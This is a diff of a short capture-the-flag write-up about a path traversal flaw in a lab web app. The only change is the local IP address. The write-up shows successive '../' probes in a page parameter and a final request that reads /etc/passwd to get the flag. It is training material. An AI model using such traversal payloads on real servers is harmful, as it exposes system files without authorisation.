@@ -1,20 +1,20 @@
 # Looking for a password
 
-__http://192.168.99.101/index.php?page__
+__http://192.168.56.101/index.php?page__
 
 ## Description and Outputs
 I decided to go to the end.
-```http://192.168.99.101/index.php?page=../``` = Wtf ?
-```http://192.168.99.101/index.php?page=../../``` = Wrong..
-```http://192.168.99.101/index.php?page=../../../``` = Nope..
-```http://192.168.99.101/index.php?page=../../../../``` = Almost.
-```http://192.168.99.101/index.php?page=../../../../../``` = Still nope..
-```http://192.168.99.101/index.php?page=../../../../../../``` = Nope..
-```http://192.168.99.101/index.php?page=../../../../../../../``` = You can DO it !!!  :]
+```http://192.168.56.101/index.php?page=../``` = Wtf ?
+```http://192.168.56.101/index.php?page=../../``` = Wrong..
+```http://192.168.56.101/index.php?page=../../../``` = Nope..
+```http://192.168.56.101/index.php?page=../../../../``` = Almost.
+```http://192.168.56.101/index.php?page=../../../../../``` = Still nope..
+```http://192.168.56.101/index.php?page=../../../../../../``` = Nope..
+```http://192.168.56.101/index.php?page=../../../../../../../``` = You can DO it !!!  :]
 
 ## Flag
 The flag is hidden there
-```http://192.168.99.101/index.php?page=../../../../../../../etc/passwd```
+```http://192.168.56.101/index.php?page=../../../../../../../etc/passwd```
 
 ## Safety
 Over the exercise we need to follow the rules
